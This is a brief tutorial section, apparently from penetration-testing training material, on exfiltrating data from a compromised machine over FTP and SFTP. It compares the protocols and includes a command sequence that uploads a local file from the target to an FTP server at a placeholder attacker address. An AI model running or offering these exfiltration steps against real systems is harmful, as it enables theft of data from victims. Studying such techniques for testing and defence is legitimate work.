Exfiltrating Data via FTP and SFTP

Utilizing standard file transfer protocols when outbound ports are open.

FTP (File Transfer Protocol)

Uses ports 20 (data) and 21 (control). Often unencrypted, making data vulnerable if intercepted. Requires an FTP server on the attacker machine.

SFTP (SSH File Transfer Protocol)

Runs over SSH (port 22), providing encryption and authentication. More secure than FTP, but requires SSH access or credentials.

Key Takeaway

FTP/SFTP are efficient for bulk data if allowed, but their visibility makes them less stealthy than covert tunneling methods.

FTP Exfiltration Example
# On attacker machine: Set up an anonymous FTP server (e.g., vsftpd)
# On target machine:
ftp YOUR_ATTACKER_IP
# Enter 'anonymous' for username, leave password blank
put local_file.txt
bye
# This transfers 'local_file.txt' to the attacker's FTP server.
